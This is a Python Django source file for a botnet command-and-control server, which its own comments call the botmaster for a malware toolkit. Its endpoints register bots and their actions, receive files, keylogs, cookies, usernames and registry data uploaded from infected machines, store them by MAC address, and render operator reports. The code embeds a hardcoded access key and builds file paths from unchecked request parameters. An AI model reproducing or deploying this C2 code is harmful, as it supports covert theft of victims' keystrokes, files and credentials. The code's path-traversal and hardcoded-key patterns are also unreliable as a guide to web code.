# PASSPHRASE AUTHENTICATION, MEANT FOR INTERNAL USE (BOTMASTER ADMIN DJANGO)
@csrf_exempt
def get_keylogging(request):
    if 'filename' not in request.GET or 'mac_address' not in request.GET or 'key' not in request.GET:
        return HttpResponse(400)
    else:
        if(request.GET['key'] != KEYLOGGING_PASSPHRASE):
            return HttpResponse(400)
        with open('./database/keylogging/'+request.GET['mac_address']+'/'+request.GET['filename']+'.txt', 'r') as f:
            return HttpResponse(f.read())
###################   END GET_KEYLOGGING   ############################

####################  START ADD_FILE  #############################
# This function is utilized for the add_file API. This function
# allows for the file to be added into the database for
# a corresponding system (mac_address)
# This API is also called by the handler API when file information is passed
@csrf_exempt
# mac_address, bot_id, filepath, file, ip_address[optional]
def add_file(request, connectionCounted=False, connObj=None, contents=None):
    # decrypt if necessary
    if('request' in request.POST):
        query_string = decryptRequest(request.POST['request'])
        dictionary = createDictionaryFromString(query_string)
    else:
        dictionary = request.POST

    # contents not parsed correctly
    if(contents == None):
        return HttpResponse(400)
        #contents = request.POST['contents']
    # print(request.POST)
    if(request.method == 'POST'):
        # parameters do not match
        if 'mac_address' not in dictionary or 'bot_id' not in dictionary or 'file' not in dictionary:
            return HttpResponse(400)

        mac_address = dictionary['mac_address']
        full_path = dictionary['file']
        file_path = os.path.dirname(full_path)
        full_path = full_path.replace('\\', '\\\\')
        file_path = file_path.replace('\\', '\\\\')
        _file = os.path.basename(full_path)
        _file = _file.replace('\\', '\\\\')

        ip_address = 'xxx.xxx.xxx.xxx'

        # CHECK IF VALID BOT_ID
        bot_id = dictionary['bot_id']
        if(getBot(bot_id)==[]):
            return HttpResponse(400)
        else:
            # increment bot connection count
            if(not connectionCounted):
                botConnectIn(bot_id)
            # bot is not allowed to connect
            bot_info = getBot(bot_id)[0]
            if(not bot_info[4]):
                return HttpResponse('BOT DENIED')

        # check if an ip address was passed as a param
        if 'ip_address' in dictionary:
            if(isIpValid(dictionary['ip_address'])):
                ip_address = dictionary['ip_address']
        # get ip address from connection to django
        if 'REMOTE_ADDR' in request.META:
            ip_address = request.META.get('REMOTE_ADDR')

        # add mac address if it is a new mac address
        if(getSystemInformation(mac_address)==None):
            # mac address is valid format
            if(isMacValid(mac_address)):
                insertSystemInformation(mac_address)
            else:
                return HttpResponse(400)
        # make sure that mac_address exists before entering file
        if(getSystemInformation(mac_address)!=None):
            # add connection if connection does not exist
            if(not connectionCounted):
                connObj= insertConnection(bot_id, mac_address,ip_address,'/api/add_file')
            if(len(getAvailableFiles(full_path)) == 0):
                insertAvailableFile(full_path, "Custom Path", False)
            insertFile(mac_address, bot_id, file_path, _file, connObj)
            # pass cookie information to the keylogging handler
            handle_uploaded_file(mac_address, bot_id, file_path, _file, contents, connObj)
        return HttpResponse(200)
######################  END ADD_FILE  #############################

###############  START HANDLE_UPLOADED_FILE ########################
# This function is utilized for handling any file info that was
# sent to the add file API, the handler appends data to the
# file with the matching timestamp
# file to the appropiate directory on the botmaster file system
def handle_uploaded_file(mac_address, bot_id, filepath, filename, string, connObj):
    try:
        os.stat("./database/files/"+mac_address)
    except:
        os.mkdir("./database/files/"+mac_address)
    try:
        os.stat("./database/files/"+mac_address+"/"+bot_id)
    except:
        os.mkdir("./database/files/"+mac_address+"/"+bot_id)
    # open file within the files folder
    _hash = hashlib.md5(filepath.encode('utf-8')).hexdigest()
    filename = "./database/files/"+mac_address+"/"+bot_id+"/"+_hash+"---"+filename
    # print(string)
    try:
        os.stat(filename)
        # print("append")
        destination = open(filename, 'ab')
    except:
        # print("create")
        destination = open(filename, 'wb')
    # write keylog info
    destination.write(string)
    # close file
    destination.close()
###############  END HANDLE_UPLOADED_FILE  ##########################

###############  START GENERATE_CONNECTION_REPORT  #########################
def generateConnectionReport(connObj,displayMac=True,displayBot=True,displayLocation=True):
    report = ""
    # connection time information
    report=report+"&nbsp Connection Info"
    report=report+"<br>\n&nbsp&nbsp&nbsp&nbsp Connection Time: "+str(connObj.timestamp)[:19]
    report=report+"<br>\n&nbsp&nbsp&nbsp&nbsp Connection Type: "+str(connObj.connection_type)+"<br>"
    # if info was sent
    info_sent=False
    # get bot that sent it
    if displayMac:
        mac_obj = System_Information.objects.filter(connection=connObj)
        for mac in mac_obj:
            report=report+"<br>\n&nbsp System Info"
            report=report+"<br>\n&nbsp&nbsp&nbsp&nbsp Mac Address: "+str(mac.mac_address)
            report=report+"<br>\n&nbsp&nbsp&nbsp&nbsp System Added: "+str(mac.created)[:19]
            report=report+"<br>\n&nbsp&nbsp&nbsp&nbsp Connection Count: "+str(getTotalConnectionCount(mac.mac_address))
            report=report+"<br>\n&nbsp&nbsp&nbsp&nbsp Connection Allowed: "+str(mac.connection_allowed)
            report=report+"<br>\n&nbsp&nbsp&nbsp&nbsp System Report: "+'<a href="" onclick="window.open(\'/database/api/get_system_report?key=H4G9A79B&mac_address='+mac.mac_address+'\');">Get Report</a>'
            report=report+"<br>\n"
    # get bot that sent it
    if displayBot:
        bot_obj = Bot_Sample.objects.filter(connection=connObj)
        for bot in bot_obj:
            report=report+"<br>\n&nbsp Bot Sample"
            report=report+"<br>\n&nbsp&nbsp&nbsp&nbsp Bot Id: "+str(bot.bot_id)
            report=report+"<br>\n&nbsp&nbsp&nbsp&nbsp Bot Created: "+str(bot.created)[:19]
            report=report+"<br>\n&nbsp&nbsp&nbsp&nbsp Connection Count: "+str(bot.connection_count)
            report=report+"<br>\n&nbsp&nbsp&nbsp&nbsp Connection Allowed: "+str(bot.connection_allowed)
            report=report+"<br>\n&nbsp&nbsp&nbsp&nbsp Bot Report: "+'<a href="" onclick="window.open(\'/database/api/get_bot_report?key=H4G9A79B&bot_id='+bot.bot_id+'\');">Get Report</a>'
            report=report+"<br>\n"
    # get location
    if(connObj.ip_address!='xxx.xxx.xxx.xxx' and displayLocation):
        loc_obj = Location.objects.filter(ip_address=connObj.ip_address)
        if(len(loc_obj)>0):
            report=report+"<br>\n&nbsp IP Address"
            report=report+"<br>\n&nbsp&nbsp&nbsp&nbsp IP Address: "+loc_obj[0].ip_address
            report=report+"<br>\n&nbsp&nbsp&nbsp&nbsp Location: "+loc_obj[0].country
            report=report+"<br>\n&nbsp&nbsp&nbsp&nbsp IP Report: "+'<a href="" onclick="window.open(\'/database/api/get_ip_report?key=H4G9A79B&ip_address='+connObj.ip_address+'\');">Get Report</a><br>\n'
    # file sent
    file_obj = Files.objects.filter(connection=connObj)
    for _file in file_obj:
        info_sent=True
        report=report+"<br>\n&nbsp File Sent "
        report=report+"<br>\n&nbsp&nbsp&nbsp&nbsp File: " +str(_file.avail_file.file_path) + "\n"
        report=report+"<br>\n&nbsp&nbsp&nbsp&nbsp Type: " +str(_file.avail_file.file_type) + "\n"
        report=report+"<br>\n&nbsp&nbsp&nbsp&nbsp Stored: " +str("./database/files/"+_file.connection.mac_address.mac_address+"/"+_file.connection.bot_id.bot_id+"/"+_file.filename)+ "<br>\n"
    # get any username sent
    user_objs = User.objects.filter(connection=connObj)
    for user in user_objs:
        info_sent=True
        report=report+"<br>\n&nbsp Username Sent "
        report=report+"<br>\n&nbsp&nbsp&nbsp&nbsp Username: " +str(user.username) + "<br>\n"
    # get sent registries
    reg_objs = Registry.objects.filter(connection=connObj)
    for reg in reg_objs:
        info_sent=True
        report=report+"<br>\n&nbsp Registry Sent"
        report=report+"<br>\n&nbsp&nbsp&nbsp&nbsp Key: " + str(reg.registry.registry_key)
        report=report+"<br>\n&nbsp&nbsp&nbsp&nbsp Type: " + str(reg.registry.registry_type)
        report=report+"<br>\n&nbsp&nbsp&nbsp&nbsp Found: " + str(reg.detected)  + "<br>\n"
    # get an keylogging file
    keylog_objs = Keylogging.objects.filter(connection=connObj)
    for keylog in keylog_objs:
        info_sent=True
        report=report+"<br>\n&nbsp Keylogging Sent"
        report=report+"<br>\n&nbsp&nbsp&nbsp&nbsp Filename: "+str(keylog.filename) + ".txt"
        report=report+"<br>\n&nbsp&nbsp&nbsp&nbsp Get File: "+"<script>function test"+str(keylog.filename)+"(){var win = window.open('/database/api/get_file?filename="+keylog.filename+"&mac_address="+str(keylog.connection.mac_address.mac_address)+"&key=H4G9A79B'); win.focus();}</script><a href='#' id='link' onclick='test"+str(keylog.filename)+"()'>View</a><br>\n"
    # if info was sent
    if not info_sent:
        report=report+"<br>\n&nbsp No Information Sent<br>"
    # get connection report link
    if not displayMac or not displayBot or not displayLocation:
        report=report+"<br>\n&nbspConnection Report: " + "<script>function test(){var win = window.open('/database/api/get_connection_report?connection_id="+str(connObj.id)+"&key=H4G9A79B', 'test'); win.focus();}</script><a href='#' id='link' onclick='test()'>Get Report</a><br>\n"
    return report

###################  END GET_CONNECTION_REPORT ########################

###############  START GET_CONNECTION_REPORT  #########################
# This function is used for the get_connection_report API so that the
# botmaster administrator interface can be utilized to generate reports 
# about the information associated with any connection made by a bot and system
# PASSPHRASE AUTHENTICATION AND UTILIZED BY THE BOTMASTER ADMIN DJANGO INTERFACE
@csrf_exempt
def get_connection_report(request):
    if 'connection_id' not in request.GET or 'key' not in request.GET:
        return HttpResponse(400)
    else:
        if(request.GET['key'] != KEYLOGGING_PASSPHRASE):
            return HttpResponse(200)
        else:
            #generate connection report
            report = '<!DOCTYPE html>\n<html lang=\"en-us\">\n<head>\n<title>Connnection Report</title>\n<link rel="stylesheet" type="text/css" href="/static/admin/css/base.css" /><link rel="stylesheet" type="text/css" href="/static/admin/css/changelists.css" /><script type="text/javascript" src="/admin/jsi18n/"></script><!--[if lte IE 7]><link rel="stylesheet" type="text/css" href="/static/admin/css/ie.css" /><![endif]--><script type="text/javascript">window.__admin_media_prefix__ = "/static/admin/";</script><script type="text/javascript">window.__admin_utc_offset__ = "\u002D14400";</script><script type="text/javascript" src="/static/admin/js/core.js"></script><script type="text/javascript" src="/static/admin/js/admin/RelatedObjectLookups.js"></script><script type="text/javascript" src="/static/admin/js/jquery.js"></script><script type="text/javascript" src="/static/admin/js/jquery.init.js"></script><script type="text/javascript" src="/static/admin/js/actions.js"></script>'+\
            '<div id="container"><!-- Header --><div id="header"><div id="branding"><h1 id="site-name"><a href="/admin/">Django administration</a></h1></div><div id="user-tools">Welcome,<strong>administrator</strong>.<a href="/">View site</a> /<a href="/admin/password_change/">Change password</a> /<a href="/admin/logout/">Log out</a></div></div>'+\
            '<div class="breadcrumbs"><a href="/admin/"> Home </a>&rsaquo; <a href="/admin/database/"> Database </a>&rsaquo; <a href="/admin/database/connection/"> Connections </a>&rsaquo; Connection Report </div>'+\
            '<!-- Content --><div id="content" class="flex"><h1>Connection Report</h1></div></div></div></div></div></head>\n'
            connections = Connection.objects.filter(id=request.GET['connection_id'])
            #get all associated information to a connection
            for connection in connections:
                report = report + "-"*60+"<br>\n"
                # number the connection
                report = report + "Connection Report<br>\n"
                # get a connection report
                report += generateConnectionReport(connection,True,True,True)
                report = report + "-"*60+"<br>\n"
                report += "<br>\n"
            report = report + "</html>"
            return HttpResponse(report)
    return HttpResponse(400)
###################  END GET_CONNECTION_REPORT ########################

#####################  START GET_BOT_REPORT  ##########################
# This function is used for the get_connection_report API so that the
# botmaster administrator interface can be utilized to generate reports 
# about the information associated with any connection made by a bot and system
# PASSPHRASE AUTHENTICATION AND UTILIZED BY THE BOTMASTER ADMIN DJANGO INTERFACE
@csrf_exempt
def get_bot_report(request):
    if 'bot_id' not in request.GET or 'key' not in request.GET:
        return HttpResponse(400)
    else:
        if(request.GET['key'] != KEYLOGGING_PASSPHRASE):
            return HttpResponse(200)
        else:
            #generate connection report
            #get bot info
            report = '<!DOCTYPE html>\n<html lang=\"en-us\">\n<head>\n<title>Bot Sample Report</title>\n<link rel="stylesheet" type="text/css" href="/static/admin/css/base.css" /><link rel="stylesheet" type="text/css" href="/static/admin/css/changelists.css" /><script type="text/javascript" src="/admin/jsi18n/"></script><!--[if lte IE 7]><link rel="stylesheet" type="text/css" href="/static/admin/css/ie.css" /><![endif]--><script type="text/javascript">window.__admin_media_prefix__ = "/static/admin/";</script><script type="text/javascript">window.__admin_utc_offset__ = "\u002D14400";</script><script type="text/javascript" src="/static/admin/js/core.js"></script><script type="text/javascript" src="/static/admin/js/admin/RelatedObjectLookups.js"></script><script type="text/javascript" src="/static/admin/js/jquery.js"></script><script type="text/javascript" src="/static/admin/js/jquery.init.js"></script><script type="text/javascript" src="/static/admin/js/actions.js"></script>'+\
            '<div id="container"><!-- Header --><div id="header"><div id="branding"><h1 id="site-name"><a href="/admin/">Django administration</a></h1></div><div id="user-tools">Welcome,<strong>administrator</strong>.<a href="/">View site</a> /<a href="/admin/password_change/">Change password</a> /<a href="/admin/logout/">Log out</a></div></div>'+\
            '<div class="breadcrumbs"><a href="/admin/"> Home </a>&rsaquo; <a href="/admin/database/"> Database </a>&rsaquo; <a href="/admin/database/bot_sample/"> Bot Samples </a>&rsaquo; Bot Sample Report </div>'+\
            '<!-- Content --><div id="content" class="flex"><h1>Bot Sample Report</h1></div></div></div></div></div></head>\n'
            bot = Bot_Sample.objects.get(bot_id=request.GET['bot_id'])
            report = report + "="*33+"<br>\n"
            report = report + "Bot ID: " + bot.bot_id + "<br>\nCreated: "+str(bot.created)[:19]+"<br>\nConnection Count: " + str(bot.connection_count) +"<br>\nConnection Allowed: " + str(bot.connection_allowed) +"><br>\n"
            action_objs = Bot_Action.objects.filter(bot_id=bot)
            if len(action_objs) == 0:
                report = report + "Bot knows no actions"
            else:
                report = report + "Bot Actions"
            for action in action_objs:
                report = report + "<br>\n&nbsp Action: " + str(action.action.action)
                report = report + "<br>\n&nbsp&nbsp&nbsp&nbsp Action Count: " + str(action.action_count)
                report = report + "<br>\n&nbsp&nbsp&nbsp&nbsp Enabled for Bot: " + str(action.enabled)
                report = report + "<br>\n&nbsp&nbsp&nbsp&nbsp Last Performed: " + str(action.last_performed)[:19]
            report = report + "<br>\n" + "="*33+"<br>\n"*2
            #get all connections
            connection_count = 1
            connections = Connection.objects.filter(bot_id=bot)
            #get all associated information to a connection
            for connection in connections:
                report = report + "-"*60+"<br>\n"
                # number the connection
                report = report + "Connection " + str(connection_count) + "<br>\n"
                # get a connection report
                report += generateConnectionReport(connection,True,False, True)
                report = report + "-"*60+"<br>\n"
                report += "<br>\n"
                connection_count=connection_count+1
            report = report + "</html>"
            return HttpResponse(report)
    return HttpResponse(400)
#####################   END GET_BOT_REPORT   ##########################

#####################  START GET_SYSTEM_REPORT  ##########################
# This function is used for the get_connection_report API so that the
# botmaster administrator interface can be utilized to generate reports 
# about the information associated with any connection made by a bot and system
# PASSPHRASE AUTHENTICATION AND UTILIZED BY THE BOTMASTER ADMIN DJANGO INTERFACE
@csrf_exempt
def get_system_report(request):
    if 'mac_address' not in request.GET or 'key' not in request.GET:
        return HttpResponse(400)
    else:
        if(request.GET['key'] != KEYLOGGING_PASSPHRASE):
            return HttpResponse(200)
        else:
            #generate connection report
            #get system info
            sys = System_Information.objects.get(mac_address=request.GET['mac_address'])
            report = '<!DOCTYPE html>\n<html lang=\"en-us\">\n<head>\n<title>System Report</title>\n<link rel="stylesheet" type="text/css" href="/static/admin/css/base.css" /><link rel="stylesheet" type="text/css" href="/static/admin/css/changelists.css" /><script type="text/javascript" src="/admin/jsi18n/"></script><!--[if lte IE 7]><link rel="stylesheet" type="text/css" href="/static/admin/css/ie.css" /><![endif]--><script type="text/javascript">window.__admin_media_prefix__ = "/static/admin/";</script><script type="text/javascript">window.__admin_utc_offset__ = "\u002D14400";</script><script type="text/javascript" src="/static/admin/js/core.js"></script><script type="text/javascript" src="/static/admin/js/admin/RelatedObjectLookups.js"></script><script type="text/javascript" src="/static/admin/js/jquery.js"></script><script type="text/javascript" src="/static/admin/js/jquery.init.js"></script><script type="text/javascript" src="/static/admin/js/actions.js"></script>'+\
            '<div id="container"><!-- Header --><div id="header"><div id="branding"><h1 id="site-name"><a href="/admin/">Django administration</a></h1></div><div id="user-tools">Welcome,<strong>administrator</strong>.<a href="/">View site</a> /<a href="/admin/password_change/">Change password</a> /<a href="/admin/logout/">Log out</a></div></div>'+\
            '<div class="breadcrumbs"><a href="/admin/"> Home </a>&rsaquo; <a href="/admin/database/"> Database </a>&rsaquo; <a href="/admin/database/system_information/"> System Information </a>&rsaquo; System Report </div>'+\
            '<!-- Content --><div id="content" class="flex"><h1>System Report</h1></div></div></div></div></div></head>\n'
            report = report + "="*33+"<br>\n"
            report = report + "Mac Address: " + sys.mac_address + "<br>\nOperating System: "+sys.op_system+ "<br>\nCPU : " +sys.cpu + "<br>\nCreated: "+str(sys.created)[:19]+"<br>\nConnection Allowed: " + str(sys.connection_allowed) +"<br>\n"
            report = report + "="*33+"<br><br>\n\n"
            #get all connections
            connection_count = 1
            connections = Connection.objects.filter(mac_address=sys)
            #get all associated information to a connection
            for connection in connections:
                report = report + "-"*60+"<br>\n"
                # number the connection
                report = report + "Connection " + str(connection_count) + "<br>\n"
                # get a connection report
                report += generateConnectionReport(connection,False,True, True)
                report = report + "-"*60+"<br>\n"
                report += "<br>\n"
                connection_count=connection_count+1
            if(len(connections)==0):
                report = report + "-"*60+"<br>\n"
                report = report + " No connections have been made <br>\n"
                report = report + "-"*60+"<br>\n"
            report = report + "</html>"
            return HttpResponse(report)
    return HttpResponse(400)
#####################   END GET_SYSTEM_REPORT   ##########################

#####################  START GET_IP_REPORT  ##########################
# This function is used for the get_connection_report API so that the
# botmaster administrator interface can be utilized to generate reports 
# about the information associated with any connection made by a bot and system
# PASSPHRASE AUTHENTICATION AND UTILIZED BY THE BOTMASTER ADMIN DJANGO INTERFACE
@csrf_exempt
def get_ip_report(request):
    if 'ip_address' not in request.GET or 'key' not in request.GET:
        return HttpResponse(400)
    else:
        if(request.GET['key'] != KEYLOGGING_PASSPHRASE):
            return HttpResponse(200)
        else:
            #generate connection report
            #get system info
            location = Location.objects.get(ip_address=request.GET['ip_address'])
            report = '<!DOCTYPE html>\n<html lang=\"en-us\">\n<head>\n<title>IP Address Report</title>\n<link rel="stylesheet" type="text/css" href="/static/admin/css/base.css" /><link rel="stylesheet" type="text/css" href="/static/admin/css/changelists.css" /><script type="text/javascript" src="/admin/jsi18n/"></script><!--[if lte IE 7]><link rel="stylesheet" type="text/css" href="/static/admin/css/ie.css" /><![endif]--><script type="text/javascript">window.__admin_media_prefix__ = "/static/admin/";</script><script type="text/javascript">window.__admin_utc_offset__ = "\u002D14400";</script><script type="text/javascript" src="/static/admin/js/core.js"></script><script type="text/javascript" src="/static/admin/js/admin/RelatedObjectLookups.js"></script><script type="text/javascript" src="/static/admin/js/jquery.js"></script><script type="text/javascript" src="/static/admin/js/jquery.init.js"></script><script type="text/javascript" src="/static/admin/js/actions.js"></script>'+\
            '<div id="container"><!-- Header --><div id="header"><div id="branding"><h1 id="site-name"><a href="/admin/">Django administration</a></h1></div><div id="user-tools">Welcome,<strong>administrator</strong>.<a href="/">View site</a> /<a href="/admin/password_change/">Change password</a> /<a href="/admin/logout/">Log out</a></div></div>'+\
            '<div class="breadcrumbs"><a href="/admin/">Home </a>&rsaquo; <a href="/admin/database/"> Database </a>&rsaquo; <a href="/admin/database/location/"> Locations </a>&rsaquo; IP Address Report</div>'+\
            '<!-- Content --><div id="content" class="flex"><h1>IP Address Report</h1></div></div></div></div></div></head>\n'
            report = report + "="*30+"<br>\n"
            report = report + "IP Address: " + location.ip_address + "<br>\nLocation: "+location.country+ "<br><br>\n\n"
            report = report + "="*30+"<br><br>\n"
            #get all connections
            connection_count = 1
            connections = Connection.objects.filter(ip_address=request.GET['ip_address'])
            #get all associated information to a connection
            for connection in connections:
                report = report + "-"*60+"<br>\n"
                # number the connection
                report = report + "Connection " + str(connection_count) + "<br>\n"
                # get a connection report
                report += generateConnectionReport(connection,True,True,False)
                report = report + "-"*60+"<br>\n"
                report += "<br>\n"
                connection_count=connection_count+1
            if(len(connections)==0):
                report = report + "-"*60+"<br>\n"
                report = report + " No connections have been made <br>\n"
                report = report + "-"*60+"<br>\n"
            report = report + "</html>"
            return HttpResponse(report)
    return HttpResponse(400)
#####################   END GET_IP_REPORT   ##########################

# NEEDS A FREQUENCY
#
###################  START GET_KEYLOGGING  ############################
# This function is utilized for the add_action API that is meant to be only
# used by the malware toolkit. When new actions are created in the toolkit
# the toolkit alerts the botmaster and the botmaster adds the action to 
# its action list so that it is aware of all available actions the toolkit
# allows 
@csrf_exempt
# passphrase, action
def add_action(request):
    if(request.method == 'POST'):
        # get data parameters
        jsonData = re.split(r'b\'\{(.+|\[+|\]+)\}\'', str(request.body))[1]
        jsonData = '{' + jsonData + '}'
        data = json.loads(jsonData)
        # parameters do not match
        if 'passphrase' not in data or 'action' not in data:
            return HttpResponse(400)
        passphrase = data['passphrase']
        # passphrase is not valid
        if(passphrase != PASSPHRASE):
            return HttpResponse(400)
        action = data['action']
        # if action does not exist, add it
        if(len(getAction(action))==0):
            insertAction(action)
        return HttpResponse(200)
    else:
        return HttpResponse(400)
###################   END GET_KEYLOGGING   ###########################

#######################  START ADD_BOT  ##############################
# This function is utilized for the add_BOT API that is meant to be only
# used by the malware toolkit. When new bot is created in the toolkit
# the toolkit alerts the botmaster and the botmaster adds the bot's ID to 
# its bot table so that the botmaster is aware of any bot and the actions 
# that that bot is able to remotely perform  
@csrf_exempt
# passphrase, bot
def add_bot(request):
    # print(request.body)
    if(request.method == 'POST'):
        # get data parameters
        jsonData = re.split(r'b\'\{(.+|\[+|\]+)\}\'', str(request.body))[1]
        jsonData = '{' + jsonData + '}'
        data = json.loads(jsonData)
        # parameters do not match
        if 'passphrase' not in data or 'bot' not in data or 'actions' not in data:
            return HttpResponse(400)

        passphrase = data['passphrase']
        # passphrase is not valid
        if(passphrase != PASSPHRASE):
            return HttpResponse(400)
        bot = data['bot']
        actions = data['actions']
        # if bot does not exist, add it
        if(len(getBot(bot))==0 and len(bot)==32):
            insertBot(bot)
        # add actions
        for action in actions:
            if(action == "Encode HTTP"):
                updateBotEncrypt(bot, True)
            # if action param does not exit, add it
            elif(getBotAction(bot, action)==None):
                insertBotAction(bot, action)
        return HttpResponse(200)
    else:
        return HttpResponse(400)
#######################   END ADD_BOT   ##############################

####################### START DATABASE ###############################
# connect the database
def connect():
    global botinfo,conn
    conn = sqlite3.connect('.\db.sqlite3')
    botinfo = conn.cursor()
    return 1

# disconnect the database
def disconnect():
    global conn
    conn.close()
#######################  END DATABASE  ###############################

#################### START GET INFORMATION ###########################
# Database get query functions which are utilized by the APIs

# This function will get the system information
# for a specified mac address
# mac address, os, cpu , connection allowed
def getSystemInformation(mac_address):
    connect()
    botinfo.execute("SELECT mac_address,op_system,cpu,connection_allowed FROM database_system_information WHERE mac_address=?",(mac_address,))
    data = botinfo.fetchone()
    disconnect()
    return data

# This function will get all usernames for
# a specified mac address
# mac address, username
def getUsernames(mac_address, connObj = None):
    #get all usernames, else get by connection
    if(not connObj):
        sys_obj = System_Information.objects.filter(mac_address=mac_address)
        conn_obj = Connection.objects.filter(mac_address=sys_obj)
    user_obj = User.objects.filter(connection=conn_obj)
    data = []
    for user in user_obj:
        data.append([mac_address,user.username])
    return data

# mac address, antivirus
#def getAntiviruses(mac_address):
#    #get all associated antivirus programs detected for a mac address
#    connect()
#    botinfo.execute("SELECT mac_address_id,antivirus_detected FROM database_antivirus WHERE mac_address_id=?",(mac_address,))
#    data = botinfo.fetchall()
#    disconnect()
#    return data

# This function will get the checked registries
# for a specified mac address
# mac address, registry
def getRegistries(mac_address):
    sys_obj = System_Information.objects.filter(mac_address=mac_address)
    conn_obj = Connection.objects.filter(mac_address=sys_obj)
    reg_obj = Registry.objects.filter(connection=conn_obj)
    data = []
    for reg in reg_obj:
        data.append([mac_address,reg.registry])
    return data

# This function will get the files received
# for a specified mac address
# mac address
def getFiles(mac_address, bot_id):
    sys_obj = System_Information.objects.filter(mac_address=mac_address)
    bot_obj = Bot_Sample.objects.filter(bot_id=bot_id)
    conn_obj = Connection.objects.filter(mac_address=sys_obj, bot_id=bot_obj)
    file_obj = Files.objects.filter(connection=conn_obj)
    data = []
    for _file in file_obj:
        data.append([mac_address,_file.avail_file])
    return data

def getAvailableFiles(file_path):
    path_obj =  AvailableFiles.objects.filter(file_path=file_path)
    return path_obj

# This function will get all connections made
# for a specified mac address overall
# mac address, ip address, timestamp of total connections
def getConnections(mac_address):
    connect()
    botinfo.execute("SELECT mac_address_id,ip_address,timestamp FROM database_connection WHERE mac_address_id=?",(mac_address,))
    data = botinfo.fetchall()
    disconnect()
    return data

# This function will get all connections made
# by a specified mac address for today
# mac address, ip address, timestamp of daily connections
def getDailyConnections(mac_address):
    connect()
    today = datetime.date.today()
    format = '%Y-%m-%d'
    epoch = int(time.mktime(time.strptime(str(today),format)))
    tomorrow = epoch + 86400
    tomorrow = time.strftime('%Y-%m-%d', time.localtime(tomorrow))
    botinfo.execute("SELECT mac_address_id,ip_address,timestamp FROM database_connection WHERE mac_address_id=? AND timestamp BETWEEN ? AND ?",(mac_address,today,tomorrow,))
    data = botinfo.fetchall()
    disconnect()
    return data

# This function return the number of connections
# a mac address made today
# returns the number of connections made today for
def getConnectionCount(mac_address):
    connectionArray = getDailyConnections(mac_address)
    return len(connectionArray)

# This function return the number of connections
# a mac address made total
def getTotalConnectionCount(mac_address):
    connectionArray = getConnections(mac_address)
    return len(connectionArray)

##################################################### WHAT AM I
#could need to be changed
# mac address, ip address, location
def getLocationFromMac(mac_address):
    # get all locations associated with a mac_address
    result = []
    # get ips associated with a mac address
    query = botinfo.execute("SELECT id,ip_address FROM database_connection WHERE mac_address_id=?",(mac_address,))
    for entry in query.fetchall():
        # get locations associated with all ip addresses
        query2 = botinfo.execute("SELECT country FROM database_location WHERE ip_address_id=?",(entry[0],))
        for entry2 in query2.fetchall():
            # build array of all locations associated with mac address
            result.insert(len(result),(mac_address,entry[1],entry2[0]))
    return result

# This function return the location recorded
# for a specific mac address
# ip address, location
def getLocationFromIp(ip_address):
    # get all locations associated with an ip address
    result = []
    # get entries from connection table associated with ip
    query = botinfo.execute("SELECT id,ip_address FROM database_connection WHERE ip_address=?",(ip_address,))
    for entry in query.fetchall():
        # get locations associated with ip address
        query2 = botinfo.execute("SELECT country FROM database_location WHERE ip_address_id=?",(entry[0],))
        for entry2 in query2.fetchall():
            # build array of all locations associated with ip address
            result.insert(len(result),(entry[1],entry2[0]))
    return result

# This function return all keylogging files that
# were associated with a specific mac address
# mac address, keylog file name
def getKeyloggings(mac_address):
    # get all keylogging entries associated with a mac address
    sys_obj = System_Information.objects.filter(mac_address=mac_address)
    conn_obj = Connection.objects.filter(mac_address=sys_obj)
    keylog_obj = Keylogging.objects.filter(connection=conn_obj)
    data = []
    for keylog in keylog_obj:
        data.append([mac_address,keylog.filename])
    return data

# This function return all cookie files that
# were associated with a specific mac address
# mac address
def getCookies(mac_address):
    # get all cookies entries associated with a mac address
    sys_obj = System_Information.objects.filter(mac_address=mac_address)
    conn_obj = Connection.objects.filter(mac_address=sys_obj)
    cookie_obj = Cookies.objects.filter(connection=conn_obj)
    data = []
    for cookie in cookie_obj:
        data.append([mac_address,cookie.filename])
    return data

# This function return the mac_address,bot_id combo 
# that is available in the AvailableConnections table
def getAvailableConnection(mac_address, bot_id):
    sys_obj = System_Information.objects.filter(mac_address=mac_address)
    bot_obj = Bot_Sample.objects.filter(bot_id = bot_id)
    if(sys_obj != None and bot_obj != None):
        avail_conn_obj = AvailableConnections.objects.get(mac_address=sys_obj,bot_id=bot_obj)
        return avail_conn_obj
    return None

# This function return an action object by name
# if that action exists
# used for action existence by name
def getAction(action):
    connect()
    botinfo.execute("SELECT id,action,enabled, frequency FROM database_action WHERE action=?",(action,))
    data = botinfo.fetchall()
    disconnect()
    return data

# This function return an action object by
# id if that action exists
# used for action existence by id
def getActionById(action_id):
    connect()
    botinfo.execute("SELECT id,action,enabled, frequency FROM database_action WHERE id=?",(action_id,))
    data = botinfo.fetchall()
    disconnect()
    return data

# This function return a boy object by id
# if that bot_id exists
# used for bot existence by id
def getBot(bot_id):
    connect()
    botinfo.execute("SELECT id,bot_id,created,connection_count,connection_allowed FROM database_bot_sample WHERE bot_id=?",(bot_id,))
    data = botinfo.fetchall()
    disconnect()
    return data

# This function return a bot_action object
# if the object exists determined by the
# bot_id, action name combination
# get bot action existence
def getBotAction(bot_id, action_name=None):
    bot = getBot(bot_id)
    if(bot == []):
        return -1
    bot = bot[0]
    action = getAction(action_name)
    if(action == [] and action_name!=None):
        return -1
    connect()
    botinfo.execute("SELECT bot_id_id,action_id,action_count,enabled,last_performed FROM database_bot_action WHERE bot_id_id=?",(bot[0],))
    data = botinfo.fetchall()
    if(action_name==None):
        return data
    else:
        for entry in data:
            if(entry[1] == action[0][0]):
                disconnect()
                return entry

# This function return a list of all
# bot_action objects in order from 
# oldest to newest
def getOrderedBotAction(bot_id, action_name=None):
    bot = getBot(bot_id)
    if(bot == []):
        return -1
    bot = bot[0]
    action = getAction(action_name)
    if(action == [] and action_name!=None):
        return -1
    connect()
    botinfo.execute("SELECT bot_id_id,action_id,action_count,enabled,last_performed FROM database_bot_action WHERE bot_id_id=? ORDER BY last_performed ASC",(bot[0],))
    data = botinfo.fetchall()
    if(action_name==None):
        return data
    else:
        for entry in data:
            if(entry[1] == action[0][0]):
                disconnect()
                return entry
####################  END GET INFORMATION  ###########################

################## START INSERT INFORMATION ##########################
#Database insert query functions which are utilized by the APIs

# This function will insert a new row
# into the system information table
def insertSystemInformation(mac_address, op_system='None', cpu='None',  connection_allowed=True):
    # convert boolean to integer
    if(connection_allowed==True):
        connection_allowed=1
    else:
        connection_allowed=0
    # mac address does not exist
    if(getSystemInformation(mac_address)==None):
        #add system information
        obj = System_Information(mac_address=mac_address,op_system=op_system,cpu=cpu,connection_allowed=connection_allowed)
        obj.save()

# This function will insert a new entry
# into the antivirus table and associate
# it with a connection table entry
